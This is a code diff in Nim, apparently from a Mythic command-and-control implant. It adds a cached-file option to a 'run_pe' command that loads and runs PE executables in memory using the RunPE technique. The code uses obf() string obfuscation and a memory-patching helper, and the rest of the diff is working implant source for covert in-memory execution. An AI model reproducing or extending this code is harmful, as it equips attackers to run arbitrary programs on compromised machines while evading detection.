@@ -3,6 +3,7 @@ import base64
 import strutils
 import json
 import ../utils/[strenc, m_responses, debug, ptr_math]
+import ../global_data
 
 proc patchMemory(targetAddr: pointer, data: seq[byte]) =
   ## Patch memory at targetAddr with data, handling protection
@@ -541,6 +542,11 @@ proc runPE*(peBytes: seq[byte]; exeArgs: string = ""; fullTls: bool = false): st
   except Exception as e:
     return "Error: " & e.msg
 
+# Forward declaration
+proc processRunPeChunk*(taskId: string, params: JsonNode, chunkData: string,
+                        totalChunks: int, currentChunk: int,
+                        fileData: var seq[byte]): JsonNode
+
 proc run_pe*(taskId: string, params: JsonNode): JsonNode =
   ## Execute a PE file in memory using RunPE technique
   ## First response - request the file from Mythic
@@ -552,6 +558,15 @@ proc run_pe*(taskId: string, params: JsonNode): JsonNode =
       
       debug "[DEBUG] run_pe: Requesting PE file"
       debug "[DEBUG] UUID for download: " & args.uuid
+      
+      # Check if using cached file
+      if params.hasKey(obf("cached")):
+        let cachedName = params[obf("cached")].getStr()
+        let cachedData = getCachedFile(cachedName)
+        if cachedData.len == 0:
+          return mythicError(taskId, obf("File not found in cache. Use register_file first: ") & cachedName)
+        var fileData: seq[byte] = @[]
+        return processRunPeChunk(taskId, params, encode(cast[string](cachedData)), 1, 1, fileData)
       
       # Step 1: Request the PE file from Mythic
       return %*{
